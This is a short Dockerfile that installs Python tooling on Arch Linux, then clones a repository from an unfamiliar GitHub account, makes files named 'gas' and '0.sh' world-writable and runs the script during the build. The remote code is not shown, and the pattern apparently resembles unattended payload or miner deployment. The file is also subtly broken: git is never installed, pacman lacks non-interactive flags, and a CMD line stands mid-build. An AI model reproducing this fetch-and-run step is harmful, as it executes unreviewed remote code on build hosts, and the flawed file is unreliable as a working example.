FROM archlinux:latest AS build

RUN pacman -Sy && pacman -S python python-pip python-virtualenv
CMD ["echo", "Python, pip and virtualenv has been successfully installed."]

WORKDIR /app/

RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
